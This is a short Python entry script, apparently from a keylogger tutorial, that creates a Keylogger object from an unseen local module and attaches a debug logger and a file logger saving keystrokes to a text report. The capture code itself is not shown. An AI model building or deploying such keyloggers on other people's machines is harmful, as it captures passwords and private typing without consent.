# https://www.thepythoncode.com/article/write-a-keylogger-python

import keylogger_logger
from keylogger import Keylogger

if __name__ == '__main__':
    keylogger = Keylogger()#.save_each(5)
    keylogger.add_logger(keylogger_logger.DebugLogger())
    keylogger.add_logger(keylogger_logger.FileLogger('./keylogger-report.txt'))
    keylogger.wait()